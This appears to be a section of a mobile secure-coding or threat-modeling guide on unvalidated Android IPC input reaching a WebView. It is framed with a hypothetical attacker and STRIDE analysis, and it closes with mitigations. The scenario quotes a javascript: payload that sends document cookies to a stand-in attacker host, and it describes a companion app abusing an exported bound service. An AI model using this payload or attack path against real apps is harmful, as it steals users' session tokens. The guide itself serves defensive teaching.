## Scenario: Max can modify or expose data because input validation and sanitization are not properly applied to interprocess communication or because extensions are not properly restricted

Consider a scenario where Max has identified that the target app's bound service accepts a Parcelable containing a URL, which is loaded directly into a `WebView` without sanitization. Max sends `javascript:fetch('https://attacker.example/steal?c='+document.cookie)` as the URL. The WebView executes it and exfiltrates the authentication cookie. Max did not reverse any encryption. He knocked on the IPC door and asked politely.

1. IPC inputs — intents, ContentProvider queries, bound service AIDL calls — are attacker-controllable from any installed app.
2. App extensions (keyboard, share, notification actions) run in a separate process but share data with the host app; unvalidated inputs at the extension boundary create injection paths.

### Example

Max writes a companion app that sends a crafted Bundle to the target's `MessagingService` via `bindService`. The Bundle contains a `url` key with a `javascript:` payload. The service loads the URL in a WebView inside the notification preview. The script exfiltrates the user's session token to Max's server. The service was added to enable rich-notification previews. The developer assumed that only the app itself would ever bind to it.

## Threat Modeling

### STRIDE

This scenario falls under **Tampering** and **Information Disclosure**.

Unvalidated IPC input allows an attacker to inject data that alters application behaviour, exposes sensitive information, or executes unintended code paths — all without OS privilege escalation.

### What can go wrong?

- Malicious Parcelables trigger deserialization gadget chains.
- URL parameters injected via IPC are loaded in WebViews, enabling in-app XSS.
- Extension processes relay attacker-controlled data to the host app's sensitive functions.
- Untrusted input traverses file paths, reads private files, or modifies stored configuration.

### What are we going to do about it?

- Apply the same input-validation discipline to IPC entry points as to network inputs: allowlist expected types, formats, and value ranges.
- Avoid deserializing custom Parcelable or Serializable objects from untrusted senders; prefer validated primitive types or JSON with a schema.
- In WebViews loaded from IPC-supplied URLs, validate the URL against an allowlist of permitted origins before loading.
- Restrict app extensions with precise activation rules; do not pass raw external input from an extension to the host app without sanitization.
- Apply least-authority: set `android:exported="false"` on all IPC components not intended for third-party access.
